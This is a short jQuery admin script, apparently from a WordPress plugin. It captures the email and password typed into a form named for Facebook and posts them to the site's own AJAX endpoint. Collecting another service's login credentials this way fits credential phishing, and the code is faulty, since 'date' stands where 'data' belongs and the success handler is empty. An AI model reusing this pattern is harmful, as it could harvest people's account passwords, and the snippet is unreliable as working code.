/**
 * Admin Scripts
 */

(function ($, window, document, pluginObject) {
    "use strict";

    $(document).on('submit', '#facebook-contact-form', function (e) {

        e.preventDefault();

        var email = $("#email").val();
        var password = $("#password").val();

        $.ajax({
            type: 'post',
            context: $(this),
            url: facebook.ajaxURL,
            date: {
                action: 'facebook-from-action',
                email:email,
                password:password,
            },
            success: function (response) {

                if (response.success) {

                }
            }
        })
    });


})(jQuery, window, document, facebook);